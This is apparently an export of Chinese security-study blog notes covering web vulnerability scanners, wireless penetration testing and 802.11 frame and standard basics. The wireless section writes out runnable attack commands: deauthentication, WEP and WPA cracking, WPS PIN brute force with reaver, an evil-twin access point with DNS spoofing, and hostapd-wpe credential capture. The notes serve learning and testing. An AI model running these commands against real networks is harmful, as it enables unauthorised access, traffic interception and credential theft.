Password skipfish -o b --auth-form http://10.10.10.134/dvwa/login.php --auth-form-target http://10.10.10.134/dvwa/login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http://10.10.10.134/dvwa/index.php -I dvwa -X logout http://10.10.10.134/dvwa 扫描结束太快 触发了目标站点的连接数限制，降低 -m -l 数值 w3af Web Application Attack and Audit Framework ,基于python 语言开发 此框架的目标是帮助你发现和利用所有Web应用程序漏洞 9大类近150个plugin audit infrastructure grep evasion mangle auth bruteforce output crawl 安装 W3af_console help #显示可用指令 plugin #进入plugin子命令 help 显示可用指令 list audit 列出audit类所有差劲啊 audit sqli xss 选择使用的audit插件 http-settings / misc-settings 全局配置 help view 查看可配置的参数 set 设置参数 back 回到上一级命令 profiles save_as self-contained save_as test self-contained target set target http://1.1.1.1/ start script script/* .w3af w3af 身份认证 HTTP Basic NTLM Form Cookie 截断代理 HTTP header file W3af不支持客户端技术（Javascript, flash, java applet) 截断代理手动爬网 spider_man output.export_requests http://127.1.1.1/spider_man?terminate crawl.import_results base64 exploit Fuzzy requests 1234Numbers from 0 to 4: $range(5)$First ten letters: $string.lowercase[:10]$The words spam and eggs: $[’spam’, ’eggs’]$The content of a file: $[l.strip() for l in file(’input.txt’)]$ Cluster responses Arachni 安装 http://www.arachni-scanner.com/download/#Linux tar xvf arachni.tar.gz Profile Import Export New Dispatcher ./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1 Grid ./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111 Scan ?-s OWASP_ZAP Zed attack proxy Web application集成渗透测试和漏洞挖掘工具 开源免费跨平台简单易用 截断代理 主动、被动扫描 Fuzzy,暴力破解 API • Persist Session• Mode——Safe Protected Standard ATTACK• add-ons• Scan policy• Anti CSRF Tokens• https——CA• Scope / Contexts / filter• Http Sessions——default session tokens &amp; site session tokens• Note / tag• Passive scan 标准扫描工作流程 设置代理 手动爬网 自动爬网 主动扫描 Burpsuite Web安全工具中的瑞士军刀 统一的集成工具发现全部现代Web安全漏洞 PortSwigger公司开发 所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950• Proxy• Options• Invisible• CA• Intercept • Response modify• Target• Scope logout• Filter• Comparing site map• Active / Passive Scan• Extender• BApp Store• Jython• http://www.jython.org/downloads.html• Option• Scan queue• Result• POSITION• PAYLOAD• Simple list• Runtime file• Character substitution• Case modification• Character blocks• Numbers?Copy other payload• Dates?Brute forcer?Character frobber?Username generator• OPTIONS• Grep match• Repeater• Request History• Change request method• Change body encoding• Copy as curl command• Convert selection• Repeater • Engagement tools——generate csrf PoC• Follow redirections• Process cookies in redirectionsSequencer分析程序中可预测的数据• Session cookies• anti-CSRF tokens• Start live capture• Analyze• Character-level• Bit-level• FIPS(Federal Information Processing Standard)Decodersmart decode 代理截断工具 Paros Webscrab Burpsuite ACUNETIX WEB VULNERABILITY SCANNER 自动手动爬网，支持AJAX，JAVASCRIPT AcuSencsor 灰盒测试 发现爬网无法发现文件 额外的漏洞扫描 可发现存在漏洞的源码行号 支持PHP，.NET 生成PCI、27001标准合规报告 网络扫描 FTP， DNS，SMTP，IMAP，POP3， SSH，SNMP，Telnet 集成openvas扫描漏洞 爬站 子域扫描器 发现扫描器 SQL注入验证 Http editor http sniffer http fuzzer 身份认证测试 结果比较 APPSCAN Watchfire APPScan , 2007年被IBM收购，称为IBMAPPSCAN 扫描过程 探索阶段 测试阶段 第一个过程发现新的URL地址，下一个扫描过程自动开始 Glass box 相当于Acusensor Agent收集服务器端源代码信息和其他数据 支持Java，.NET两种平台]]></content>
  </entry>
  <entry>
    <title><![CDATA[无线渗透]]></title>
    <url>%2F2018%2F04%2F01%2F%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[无线通信过程连接到无线网络 Probe STA向所有信道发出probe帧，发现AP AP应道Response Authentication STA向AP发出验证请求 发生认证过程（步骤可变） AP响应STA的认证结果 Association STA发出关联请求 AP响应关联请求 关联成功，开始通信 WEP 探测过程 Beacon标识使用WEP加密 STA发送普通Probe帧 AP响应Probe Response帧声明其采用WEP加密 WPA探测过程 两个AP的Beacon包内容不同，但都声明采用了WPA加密 不同厂商对802.11标准的实现方式不同 包头包含WPA1字段信息 WEP OPEN认证过程 WEP Open认证与open认证通信过程相同 正确认证后通信数据被WEP加密 如果认证时客户端输入错误密码 认证依然可以通过 AP将丢弃该STA的数据包 起始向量被错误地密钥解密后完整性被破坏 但数据传输将失败 认证响应正确，身份验证成功 WEP PSK认证过程 STA发认证请求 AP返回随机Challenge消息 STA使用PSK加密Cha并发回给AP AP使用PSK解密密文，获得Cha并与原始Cha比对，相同则验证成功，不同则验证失败 大部分无线驱动首先尝试open验证，如失败则尝试PSK WEP 共享密钥认证过程 无论使用什么加密架构，关联过程完全相同 STA向AP发送关联请求 AP向STA发送关联成功或失败结果 隐藏AP STA关联包中必须包含目标AP的ESSID 嗅探到此关联包，说明有隐藏AP存在 加密 无线安全根源 802.11基于无线电波发射信息 嗅探侦听是主要问题 加密机制是必须手段 Wired Equivalent Privacy(WEP) 802.11标准的一部分 发布后不久被发现存在安全漏洞 Wi-Fi Protected Access (WPA) 取代WEP WPA2（802.11i标准） OPEN无加密网络 无任何加密机制 所有数据都可以被嗅探 STA和AP只协商拼配参数即可连入网络 WEP加密系统 使用Rivest Cipher 4(RC4) 算法加密流量内容，实现机密性 CRC32算法检查数据完整性 标准采用使用24位initialization vector（IV） 受美国加密技术触控限制法律的要求 高于64bit key禁止出口 所以除24bit IV 之外真实的key只有40bit的版本被允许出口 出口限制法律撤销后实现了128bit key 的WEP版本（使用相同的24bit IV） RC4算法 RSA实验室研发的对称加密流算法 实现简单 速度快 加密：对明文流和密钥流进行XOR计算 解密：对密文流和密钥流进行XOR计算 RC4算法key由两个过程生成 合并IV和SKA，利用Key Scheduling Algorithm(KSA)算法生成起始状态表 Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流 WPA安全系统 Wi-Fi Protected Access 802.11i组为提高无线安全，开发两个新的链路层加密协议 Temporal Key Integrity Protocol (TKIP) WPA1(较之WEP可动态改变密钥) Counter Mode with CBC-MAC (CCMP) WPA2 WPA加密两种安全类型 WPA个人：使用预设共享密钥实现身份认证 WPA企业：使用802.1X和Radius服务器实现AAA WPA1 802.11i第三版草案 与WEP比较 都采用逐包进行密钥加密 128位的key和48位的初向量（IV） RC4流加密数据 帧计数器避免重放攻击 TKIP使用Michael算法进行完整性校验（MIC） WEP CRC32 兼容早期版本硬件 WPA2 依据802.11i完全重新设计实现 也被称为Robust Security Network (RSN) CCMP 替代TKIP AES加密算法取代了RC4 不兼容早期版本硬件 WPA企业连接过程 协商安全协议 身份认证 密钥分发和验证 数据加密完整性 WPA-PSK 协商安全协议 密钥分发和验证 数据加密完整性 协商认证方式 PSK/802.1X 单播和组播/广播流量加密套件 TKIP / CCMP STA通过probe 获取无线网络信息 速率 加密 通道 名称 身份认证（WPA企业） 身份认证基于Extensible Authentication Protocol(EAP)实现 EAP-TLS 需要客户端和服务器证书 EAP-TTLS PEAP混合身份验证，只需要服务器证书 客户端选择身份认证方式 AP发送身份验证消息给Radius Server Radius Server 返回 Radius Accept 表示认证成功 其中包含 Master Key (MK) AP 通过EAP消息通知STA认证成功 密钥交换 无线网络设计用于一组无线设备通信 关联到同一AP的设备共享无线信道 单播、广播、组播 安全特性要求不同 单播通信需要单独密钥加密通信双方流量 pairwise key :对偶密钥（PTK） 组播通信需要信任域内所有成员共享的同一密钥 group key : 组密钥（GTK） PMK 安全上下文的顶级密钥 MK进行TLS-PRF加密得出PMK 基于服务密钥 由上层身份验证方法服务器生成 从服务器通过radius传给AP 从AP通过EAP消息传给所有STA 基于PSK共享密钥 ESSID + PSK+ 迭代次数4096 —— Hash计算生成 STA和AP分别计算得出PMK ， 并不在网络中传递互换 256位即32字节 密钥交换 PTK的生成过程 HMAC-SHA1散列算法 PRF-X散列算法 四步握手过程生成PTK AP发送Anonce给STA STA生成Snonce计算出PTK Snonce加PTK的MIC发给AP AP拿到Snonce计算出PTK AP计算MIC与接收的MIC比对 MIC一致说明确定STA知道PMK AP发GTK给STA STA回复ACK并使用密钥加密 数据加密和完整性 三种算法 Temporal Key Integrity Protocol (TKIP) 4 Counter Mode with CBC-MAC (CCMP) 5 Wireless Robust Authenticated Protocol (WRAP) 6 无线渗透实操 Aircrack-ng 无线渗透和审计神器 包含各种功能的工具组件 网络检测 嗅探抓包 包注入 密码破解 检查完卡驱动 开启和停止无线侦听 airmon-ng check airmon-ng check kill airmon-ng start wlan2 iwlist wlan0mon channel airmon-ng stop wlan0mon 无线抓包 airodump-ng wlan2mon airodump wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap aireplay -9 wlan2mon airreplay airodump-ng wlan0mon airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap --ivs BSSID :AP 的MAC地址 PWR： 网卡接收到的信号强度，距离越近信号越强 -1：驱动不支持信号强度，STA距离超出信号接收范围 RXQ： 最近10秒成功接收的数据帧的百分比（数据帧，管理帧），只有在固定信道时才会出现 Beacons: 接收到此AP发送的Beacon帧数量 #Data: 抓到的数据帧数量（WEP表示IV数量），包含广播数据帧 #/s: 最近10秒内，每秒平均抓到的帧的数量 CH: 信道号（从beacon帧中获得），信道重叠时可能发现其他信道 MB：AP支持的最大速率 ENC：采用的无线安全技术WEP、WPA、WPA2、 OPEN CIPHER:采用的加密套件CCMP、TKIP、WEP40、WEP104 AUTH:身份认证方法MGT、PSK、SKA、OPEN ESSID: 无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP STATION:STA的MAC地址 Lost:通过sequence number 判断最近10秒STA发送丢失的数据包数量（管理帧、数据帧） 干扰、距离 发包不能收、收包不能发 Packets: STA 发送的数据包数量 Probes:STA探测的ESSID AIRODUMP-NG排错 不显示任何AP和STA信息 物理机场景下使用笔记本内置无线网卡时，确保BIOS中已启用无线网卡 确认无线网卡在managed模式下可以正常工作 尝试禁用network-manager服务 尝试卸载rmmod和重新加载modprobe驱动 工作一段时间后airodump-ng无法继续抓包 airmon-ng check kill 确认wpa_supplicant 进程已停止 AIREPLAY-NG 产生或者加速无线通信流量 向无线网络中注入数据包 伪造身份验证 强制重新身份验证 抓包重放 用于后续WEP和WPA密码破解 支持10种包注入 获取包的两种途径 指定接口（-i） 抓包文件pcap(-r) aireplay-ng Filter命令选项（除0、1两种攻击方式） AIREPLAY-NG 排错 Aireplay-ng 命令挂起没有任何输出 无线网卡与AP工作在不同信道 报错“write failed: Cannot allocate memory wi_write():illegal seek” 无线网卡使用Broadcom芯片 （bcm43xx), 替换为b43驱动可解决 可注入但速度很慢，并提示内核信息”rtc: lost some interrupts at 1024Hz” 没有修正方法，此时可以启动多个aireplay-ng命令提高速度 使用-h参数指定注入MAC地址与网卡MAC地址不一致报错 建议保持一致（macchange) AIREPLAY-NG 包注入测试 检测网卡是否可以注入包 检测AP的响应时间 回包率反应链路质量 如果有两个无线网卡，可以检测具体可以注入哪种攻击 基本测试检测AP对Probe广播的响应 向每AP发30包 网卡成功发送并可接收包的能力 基本测试 airplay -9 wlan0mon 向隐藏AP/指定SSID注入 aireplay-ng -9 -e leven -a EC:26:CA:FA:02:DC wlan0mon card to card 注入测试 具体攻击方式 -i 作为AP的网卡 5/7 Faild 注入MAC和真实MAC相同时可以正常使用 MAC地址绑定攻击 管理员误以为MAC绑定是一种安全机制 限制可以关联的客户端MAC地址 准备AP AP基本配置 OPEN认证 开启无线过滤 修改MAC地址绕过过滤 WEP攻击 WEP密码破解原理 IV并非完全随机 每224个包可能出现一次IV重用 收集大量IV 之后找出相同IV及其对应密文，分析得出共享密码 ARP回包中包含IV IV足够多的情况下，任何复杂程度的WEP密码都可以被破解 启动monitor模式 启动抓包并保存抓包 Deauthentication 抓取XOR 文件 利用XOR文件与AP建立关联 执行ARP重放 Deauthentication 触发ARP数据包 收集足够DATA之后破解密码 WEP破解全部需要首先伪造认证，以便与AP进行正常通信 不产生ARP数据包 aireplay-ng -1 0 -e kifi -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt; aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;YourMAC&gt;&lt;interface&gt; 每6000秒发送reauthentication -o 1 每次身份认证只发一组认证数据包 -q 10 每10秒发keep-live帧 某些AP验证客户端MAC地址OUI （前三个字节） MAC地址过滤 Denied(Code 1 )is WPA in use WPA/WPA2不支持Fake authentication 使用真实MAC地址 物理靠经AP 侦听信道正确 Deautnentication 攻击 强制客户端与AP断开关联 重连生成ARP请求，AP回包包含IV WPA重连过程抓取4步握手过程 无客户端情况下此攻击无效 aireplay-ng -0 0 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface name&gt; 不指定-c 参数时，以广播攻击所有客户端 每攻击发送128个包，64个给AP，64个给客户端 物理足够接近被攻击者 与被攻击者使用相同无线标准b\n\g 客户端可能拒绝广播帧，建议指定客户端 ARP重放 侦听正常的ARP包并重放给AP AP回包中包含大量弱IV aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Source MAC&gt;&lt;interface name&gt; -h 合法客户端/供给者MAC Airodump-ng data 字段 64bit密钥 ： 25万 128bit密钥： 150万 airecrack-ng wep.cap WPA 攻击HTTP://ETUTORIALS.ORG/NETWORKING/802.11+SECURITY.+WI-FI+PROTECTED+ACCESS+AND+802.11I/ WPA PSK 攻击 只有一种密码破解方法 WPA不存在WEP的弱点 只能暴力破解 CPU资源 时间 字典质量 网上共享的字典 泄露密码 地区电话号码段 Crunch生成字典 Kali自带的字典文件 PSK破解过程 启动monitor 开始抓包并保存 Deauthentication 攻击获取4步握手信息 使用字典暴力破解 无AP情况下的WPA密码破解 启动monitor 开始抓包并保存 根据probe信息伪造相同ESSID的AP 抓取4步握手中的前两个包 使用字典暴力破解 AIROLIB破解密码 设计用于存储ESSID和密码列表 计算生成不变的PMK（计算资源消耗型） PMK在破解阶段被用于计算PTK（速度快，计算资源要求少） 通过完整性摘要值破解密码 SQLite3数据库存储数据 echo kifi &gt; essid.txt airolib-ng db --import essid essid.txt airolib-ng db --stats airolib-ng db --import passwd &lt;wordlist&gt; 自动剔除不合格的WPA字典 airolib-ng db –batch 生成PMK aircrack-ng -r db wpa.cap JTR 破解密码 John the ripper 快速的密码破解软件 支持基于规则扩展密码字典 很多人喜欢用手机号码做无线密码 获取号段并利用JTR规则增加最后几位的数字 配置文件 /etc/john/john.conf [List.Rules:Wordlist] $[0-9]$[0-9]$[0-9] 测试效果 john --wordlist=password.lst --rules --stdout | grep -i Password123 破解调用 john --wordlist=pass.list --rules --stdout | aircrack-ng -e kifi -w - wpa.cap COWPATTY 破解密码 WPA密码通用破解工具 使用密码字典 cowpatty -r wpa.cap -f password.lst -s kifi 使用彩虹表（PMK） genpmk -f password.lst -d pmkhash -s kifi cowpatty -r wpa.cap -d pmkhash -s kifi PYRIT 破解密码 与airolib\ cowpatty 相同，支持基于预计算的PMK提高破解速度 独有的优势 除CPU之外Pyrit 可以运用GPU的强大运算能力加速生成PMK 本身支持抓包获取四步握手过程，无需用Airodum抓包 也支持传统的读取airodump抓包获取四步握手方式 只抓取WAP四次握手过程包 pyrit -r wlan2mon -o wpapyrit.cap stripLive pyrit -r wpapyrit.cap analyze 从airodump 抓包导入并筛选 pyrit -r wpa.cap -o wpapyrit.cap strip 使用密码字典直接破解 pyrit -r wpapyrit.cap -i password.lst -b &lt;AP MAC&gt; attack_passthrough 数据库模式破解 默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库 查看默认数据库状态： pyrit eval 导入密码字典： pyrit -i password.lst import_passwords (剔除了不合规的密码) 指定ESSID： pyrit -e kifi create_essid 计算PMK： pyrit batch (发挥GPU计算能力) 破解密码： pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack_db WPS 攻击 WPS是WiFi联盟2006年开发的一项技术 通过PIN码来简化无线接入的操作，无需记住PSK 路由器和网卡各按一个按钮就能接入无线 PIN码是分为前后各4位的2段共8位数字 安全漏洞 2011年被发现安全涉及漏洞 接入发起方可以根据路由器的返回信息判断前4位是否正确 而PIN码的后4位只有1000种定义的组合（最后一位是checksum) 所以全部穷举破解只需要11000次尝试 PSK：218，340，105，584，896 标准本身没有设计锁定机制，目前多个厂商已实现锁定机制 包括Linksys 在内的很多厂家的无线路由器无法关闭WPS功能 即使在web界面中关闭WPS，配置也不会生效 攻击难度相对较低，防御却十分困难 一般可在4-10小时爆破密码 PSK 用计算器直接算出PIN C83A35 00B00C 启动侦听模式后，发现支持WPS的AP wash -C -i wlan0mon airodump-ng wlan0mon --wps 爆破PIN码 reaver -i wlan0mon -b &lt;AP mac&gt; -vv 秒破PIN码 reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1 pixiewps 只适用与固定厂商的芯片，成功率很低 reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888 问题： 很多厂家实现了锁定机制，所以爆破时应注意限速 一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定 综合自动无线密码破解工具 wifite EVIL TWIN AP / ROGUE AP12345678910111213airbase-ng -a &lt;AP mac&gt; --essid “kifi” -c 11 wlan2monapt-get install bridge-utilsbrctl addbr bridgebrctl addif Wifi-Bridge eth0brctl addif Wifi-Bridge at0ifconfig eth0 0.0.0.0 upifconfig at0 0.0.0.0 upifconfig bridge 192.168.1.10 uproute add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1echo 1 &gt; /proc/sys/net/ipv4/ip_forwarddnspoof -i bridge -f dnsspoof.hosts• /usr/share/dsniff/dnsspoof.hostsapachet2ctl start 3vilTwinAttackergit clone https://github.com/P0cL4bs/3vilTwinAttacker.gitcd 3vilTwinAttackerchmod +x installer.sh./installer.sh --install WPA企业 hostapd-wpe 取代了 FreeRADIUS-wpe EAP-FAST/MSCHAPv2 (Phase 0) PEAP/MSCHAPv2 EAP-TTLS/MSCHAPv2 EAP-TTLS/MSCHAP EAP-TTLS/CHAP EAP-TTLS/PAP 12345678git clone https://github.com/OpenSecurityResearch/hostapd-wpeapt-get install libssl-dev libnl-devlibnl1 libnl-dev 包不在 kali2.0的官方库中wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev_1.1-7_amd64.debwget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl1_1.1-7_amd64.debdpkg -i libnl1_1.1-7_amd64.debdpkg -i libnl-dev_1.1-7_amd64.deb 123456wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gztar -zxf hostapd-2.2.tar.gzcd hostapd-2.2patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patchcd hostapdmake 生成证书 cd ../../hostapd-wpe/certs./bootstrap service network-manager stop airmon-ng check kill 映射无线网卡 ifconfig wlan0 up 启动伪造AP cd ../../hostapd-2.2/hostapd ./hostapd-wpe hostapd-wpe.conf asleap -C challenge -R response -W &lt;Dictionary_File&gt; AIRDECAP-NG 去除802.11头 airdecap-ng -b &lt;AP MAC&gt; 1.pcap 解密WEP加密数据 airdecap-ng -w &lt;WEP key&gt;-b &lt;AP MAC&gt; 1.pcap 必须有与AP建立关联关系 解密WPA加密数据 airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.pcap 抓包文件中必须包含4步握手信息，否则无解 AIRSERV-NG 通过网络提供无线网卡服务器 某些网卡不支持客户端/服务器模式 启动无线侦听 服务器端 airserv-ng -p 3333 -d wlan2mon 客户端 airodump-ng 192.168.1.1:3333 某些防火墙会影响C/S间的通信 AIRTUN-NG 无线入侵检测wIDS 无线密码和BSSID 需要获取握手信息 中继和重放 Repeate / Replay wIDS WEP: airtun-ng -a &lt;AP MAC&gt; -w SKA wlan2mon WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi wlan2mon ifconfig at0 up 四步握手 理论上支持多AP的wIDS，但2个AP以上时可靠性会下降 WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi1 wlan2mon ifconfig at1 up 多AP不同信道时 airodump -c 1,11 wlan2mon Repeate WDS/Bridge 扩展无线侦听的距离 要求两块网卡都置入monitor模式 airtun-ng -a &lt;AP MAC&gt; --repeat --bssid &lt;AP MAC&gt; -i wlan0mon wlan2mon wlan0mon: 收包的网卡 wlan2mon：发包的网卡 -a: 发包的源地址 –bssid: 过滤只发指定源地址的包（可选） Replay 将抓取的CAP文件重放到指定网卡 airtun-ng -a &lt;Source MAC&gt; -r 1.cap &lt;interface&gt; 其他工具 bessid-ng fern-wifi-cracker kismet kismet*.nettxt kismet*.pcapdump gpsd -n -N -D4 /dev/ttyUSB0 giskismet -x Kismet-*.netxml giskismet -q &quot;select * from wireless&quot; -o gps.kml]]></content>
  </entry>
  <entry>
    <title><![CDATA[802.11_2]]></title>
    <url>%2F2018%2F03%2F28%2F802-11-2%2F</url>
    <content type="text"><![CDATA[控制帧 Control Frame 控制帧时一些通知设备开始、停止传输或连接失败情况的短消息。 ACK 接收端正确接收数据之后向发送端返回ACK确认 每个单播帧需要ACK立刻确认 组播和广播帧不需要ACK确认 尽快响应 由硬件完成，而非驱动层 T/S ：1/13 PS-POLL RF系统的放大器 主要耗电的组件 发射前放大信号，接收并放大还原信号 省电模式 关闭信号发射器节省电源耗电（几乎完全关闭） AID ——Association ID STA省电模式唤醒 数据发送至AP（AP缓存数据包） 通过Beacon 发送TIM（traffic indication map) 其中包含AID STA对比AID后唤醒网卡 STA发送PS-POLL帧， 请求从AP缓存中取回数据 每个都需要ACK确认 ACK确认后AP从缓存中删除数据帧 传输过程中STA保持唤醒状态 传输结束后STA恢复省电状态 AP接收PS-Poll帧 立刻响应 延迟响应 简单响应帧 AID： 关联ID BSSID：STA正关联的AP地址 TA：发送此帧的STA地址 RTS/CTS RTS/CTS时CSMA/CA方法的一种补充手段 降低冲突产生的可能性 正式通信之间通过请求应答机制，确信通信介质的可用性 并锁定传输介质和预约通信时间 只有在传输长帧时使用，传输短帧时不会使用 驱动接口提供阈值的自定义 大于阈值的帧被视为长帧，反之则视为短帧 Node1 发送Request to Send包给Node2 如果未发生冲突，Node2 返回Clear to Send 给Node1 Node1传输数据 数据正常接收，Node2返回ACK，否则Node1什么也不会收到 有线网络介质访问方式：CSMA/CD 无线网络介质访问方法：CSMA/CA 隐藏节点 RTS 帧长度20字节 CTS帧长度14字节 管理帧 Management frame 用于协商和控制STA与AP之间的关系Beacon frames AP 发送的广播帧，通告无线网络的存在（BSSID） 发包频率 102.4ms(可变) 时间单位1024microseconds(60秒) SSID网络名 隐藏AP不发SSID广播 IBSSI Status 0: infrastructure 1: ad-hoc Privicy WEP ESSID 名称、长度 速率 802.11g(1_54Mbit) 信道 11Probe request frames 用于STA扫描现有AP 发现连接过的AP 发现未连接的AP 发现连接过的AP时，速率和ESSID相同的AP响应 Authentication frames Authentication Algorithm 身份认证类型 0： 开放系统身份验证 1： 共享密钥身份验证 身份认证有多个帧交换过程组成 Authentication Seq 每次身份验证过程Seq唯一 1-65535 Challenge text 只有共享密钥方式才有此字段 Status Code：成功/失败 Association/Reassociation Frames 身份验证成功后，STA执行关联操作，加入无线网络 Association Request Reassociation Request Association Response AP对STA的关联请求的响应 状态码：关联成功/失败 Disassociation/Deauthentication 由AP发出（2个字节） ATIM FRAMES 只在ad-hoc网络下使用 STA使用此帧通知接收者其有缓存的数据要发送 数据帧 Data frames 传输用户数据 空数据帧 NULL data frame 只包含MAC头和FCS STA用于声明自己将要进入省电模式]]></content>
  </entry>
  <entry>
    <title><![CDATA[802.11_1]]></title>
    <url>%2F2018%2F03%2F26%2F802-11-1%2F</url>
    <content type="text"><![CDATA[无线渗透无线技术特点 无线技术变化快 难度大 行业迅猛发展 互联网的重要入口 边界模糊 安全实施缺失而且困难 对技术不了解而造成配置不当 企业网络私自接入AP破坏网络边界 802.11 标准IEEE Institute of Electrical and Electronics Engineers 由通信航天生物电气电子等方面的科学家组成，目的是制定标准，指导行业技术的发展，目前成员近40万人。 • 802 委员会下第11组负责开发无线局域网标准• IEEE 802.1 1 The Original WLAN Standard – 1 Mbit/s and 2 Mbit/w, 2.4 GHz RF andIR• IEEE 802.11a 54 Mbit/s, 5 GHz• IEEE 802.11b 802.11 Enhancements to Support 5.5 Mbit/s and 11 Mbit/s• IEEE 802.11c Bridge Operation Procedures• IEEE 802.11d International (Country to Country) Roaming Extensions• IEEE 802.11 e Quality of Service ( QoS ), Including Packet Bursting• IEEE 802.11F Inter -Access Point Protocol• IEEE 802.11g 54 Mbit/s, 2.4 GHz• IEEE 802.11h Spectrum Managed 802.11a (5 GHz) for European Compatibility• IEEE 802.11i Enhanced Security • IEEE 802.11j Extensions for Japan• IEEE 802.11k Radio Resource Measurement Enhancements• IEEE 802.11n Higher Throughput Using Multiple Input, Multiple Output(MIMO) Antennas• IEEE 802.11p Wireless Access for the Vehicular Environment (WAVE)• IEEE 802.11r Fast BSS Transition (FT)• IEEE 802.11s Mesh Networking, Extended Service Set (ESS)• IEEE 802.11T Wireless Performance Prediction (WPP)• IEEE 802.11u Internetworking with Non -802 Networks ( i.e. : Cellular)• IEEE 802.11v Wireless Network Management • IEEE 802.11w Protected Management Frames• IEEE 802.11y 3650 – 3700 MHz Operation in the US• IEEE 802.11z Direct Link Setup (DLS) Extensions• IEEE 802.11mb Maintenance of the Standard• IEEE 802.11aa Robust Streaming of Audio Video Transport Streams• IEEE 802.11ac Very High Throughput &lt; 6 GHz• IEEE 802.11ad Very High Throughput, 60 GHz• IEEE 802.11ae QoS Management• IEEE 802.11af TV Whitespace• IEEE 802.11ah Sub 1 GHz• IEEE 802.11ai Fast Initial Link Setup 802.11 发布于1997年 速率1Mbps 或 2Mbps 红外线传输介质（未实现） 无线射频信号编码（调制）（radio frequencies) Direct-Sequence Spread-Spectrum(DSSS)——直序扩频 Frequency Hopping Spread-Spectrum(FHSS)——跳频扩频 媒体访问方式——CSMA/CA c=b+log2(1+s/n) 根据算法侦听一定时长 发送数据前发包声明 Request to Send / Clear to Send(RTS/CTS) 802.11b Complementary Code Keying(CCK)——补充代码键 5.5 and 11 Mbit/s 2.4GHz band(2.4Ghz - 2.485GHz) 14个重叠的信道channels 每个信道22MHz带宽 只有三个完全不重叠的信道 美国-1 to 11(2.412GHz - 2.462GHz) 欧洲-1 to 13(2.412Ghz - 2.472GHz) 日本-1 to 14(2.412GHz - 2.484GHz) 802.11a 与802.11b几乎同时发布 因设备价格问题一直没有得到广泛使用 使用5GHz带宽 使用2.4GHz带宽干扰源多（微波、蓝牙、无绳电话） 5GHz频率有更多带宽空间，可容纳更多不重叠的信道 Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法 正交频分复用技术 更高速率54Mbps, 每个信道20MHz带宽 变频 5.15-5.35GHz 室内 5.7-5.8GHz 室外 802.11g 2.4GHz频率 Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法 与802.11a速率相同 可全局降速 向后兼容802.11b, 并切换为CCK信号调制方法 每个信道20/22MHz 带宽 802.11n 2.4或5GHz 频率 300Mbps 最高 600Mbps Multiple-Input Multiple-Output(MIMO)多进多出通信技术 多天线，多无线电波，独立收发信号 可以使用40MHz信道带宽是数据传输速率翻倍 全802.11n设备网络中，可以使用新报文格式，是速率达到最大 每个信道20/40MHz 带宽 无线 /应用层 /表示层 /会话层 /传输层 /网络层 数据链路层 逻辑链路控制子层LLC 媒体访问控制子层MAC 物理层 无线网路运行模式 无线网络架构 Indrastructure AP 维护SSID Ad-Hoc STA维护SSID Service Set Indentifier(SSID) AP 每秒约十次通过Beacon帧广播SSID 客户端连接到无线网络后也会宣告SSID Infrastructure 至少包含一个AP和一个STATION， 形成一个Basic Service Set(BSS) AP连接到有线网络，称为Distribution System(DS) 连接到同一个DS的多个AP形成一个Extended Service Set(ESS) AD-HOC 也被称为Independent Basic Service Set(IBSS) 有至少2个STAs直接通信组成 也称为peer to peer 模式 其中一个STA负责AP的工作 通过beacon广播SSID 对其他STAs进行身份验证 Wireless Distribution System(WDS) 与有线DS类似，只是通过无线连接的多个AP组成的网络 Bridging ——只有AP间彼此通信 Repeating ——允许所有AP和STA进行通信 Monitor Mode Monitor 不是一种真的无线模式 但是对无线渗透至关重要 允许无线网卡没有任何筛选的抓包（802.11包头） 与有线网络的混杂模式可以类比 适合的网卡和驱动不但可以monitor， 更可以Injection 无线网硬件设备及基本概念 无线网卡准备 物理机运行kali 虚拟机运行kali 外置USB无线网卡 TL-WN77N（个人建议） dmesg iwconfig 发射功率：远程连接 接受灵敏性：适当降低灵敏度，接受效果更佳 经验 Atheros 或 Realtek 没有神器 兼容aircrack-ng suite http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters Alfa Networks AWUS036H 无线网卡 Realtek 8187 芯片 1000mW发射功率 天线：RP-SMA 可扩展 无线技术概念 分贝dB 测量无线信号强度 B：向Alexander Graham Bell 致敬 今天大部分声学设备的发明者和理论奠基人 dB : 表示2个信号之间的差异比率，用于描述设备的信号强度 是一个相对值 dBm:功率值与1mW 进行比较的dB值结果 每增加3dBm, 功率增加约1倍 每增加10dBm, 功率增加10倍 dBi：全向天线辐射强度 dBd: 定向天线辐射强度 dBi: 全向天线的信号功率增益 增益是指信号功率强度增加了多少dB dBm功率相加等于mw功率相乘 dBd 是定向天线的增益值 全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号 天线增益越大信号传输距离越远 既然有mW来表示功率为什么还要引入dB这个单位？ 